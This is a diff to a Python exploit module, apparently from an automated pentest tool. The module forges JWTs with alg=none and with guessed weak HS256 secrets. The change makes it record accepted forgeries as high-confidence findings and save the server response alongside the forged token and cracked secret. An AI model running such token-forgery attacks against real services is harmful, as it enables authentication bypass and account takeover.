@@ -227,11 +227,23 @@ class JWTModule(ExploitModule):
                 )
                 path, response = await self._probe_mutation(ctx, token, forged, f"alg=none/{label}", evidence)
                 if path:
+                    response_text = getattr(response, "text", "") or ""
+                    ctx.add_finding(
+                        path,
+                        forged,
+                        "JWT / alg=none",
+                        f"HTTP {getattr(response, 'status_code', '?')}; unsigned-token mutation accepted",
+                        confidence="high",
+                        terminal_ready=False,
+                    )
                     return ExploitResult(
                         self.name,
                         "success",
                         f"JWT unsigned-token mutation accepted at {path}",
-                        artifacts=[Artifact("jwt.forged", forged, self.name)],
+                        artifacts=[
+                            Artifact("jwt.forged", forged, self.name),
+                            Artifact("jwt.response", response_text, self.name),
+                        ],
                         evidence="\n".join(evidence),
                     )
 
@@ -250,6 +262,15 @@ class JWTModule(ExploitModule):
                             ctx, token, forged, f"HS256/{secret!r}/{label}", evidence
                         )
                         if path:
+                            response_text = getattr(response, "text", "") or ""
+                            ctx.add_finding(
+                                path,
+                                forged,
+                                "JWT / HS256 weak-secret mutation",
+                                f"HTTP {getattr(response, 'status_code', '?')}; signed mutation accepted",
+                                confidence="high",
+                                terminal_ready=False,
+                            )
                             return ExploitResult(
                                 self.name,
                                 "success",
@@ -257,6 +278,7 @@ class JWTModule(ExploitModule):
                                 artifacts=[
                                     Artifact("jwt.forged", forged, self.name),
                                     Artifact("jwt.secret", secret, self.name),
+                                    Artifact("jwt.response", response_text, self.name),
                                 ],
                                 evidence="\n".join(evidence),
                             )
